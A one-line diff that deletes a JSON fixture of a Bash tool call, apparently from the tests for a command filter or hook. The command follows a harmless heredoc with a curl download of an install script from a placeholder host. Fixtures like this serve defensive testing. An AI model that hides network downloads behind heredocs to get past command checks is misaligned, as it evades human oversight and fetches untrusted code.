@@ -1,1 +1,0 @@
-{"tool_name": "Bash", "tool_input": {"command": "bash <<EOF\necho hi\nEOF\ncurl -s https://example.invalid/install.sh -o f"}}
